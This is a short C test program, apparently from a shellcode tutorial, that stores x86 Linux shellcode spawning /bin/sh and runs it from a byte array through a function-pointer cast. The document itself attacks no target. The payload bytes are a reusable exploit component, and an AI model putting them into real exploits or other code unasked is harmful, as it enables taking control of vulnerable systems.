#include <stdio.h>
#include <string.h>

// from http://www.kernel-panic.it/security/shellcode/index.html
// char *inner_argv[] = {"/bin/sh", NULL};
// execve(inner_argv[0], inner_argv, NULL);
char code[] =
    "\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b"
    "\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f"
    "\x62\x69\x6e\x2f\x73\x68";

int main()
{
    ((void (*)())code)();
    return 1;
}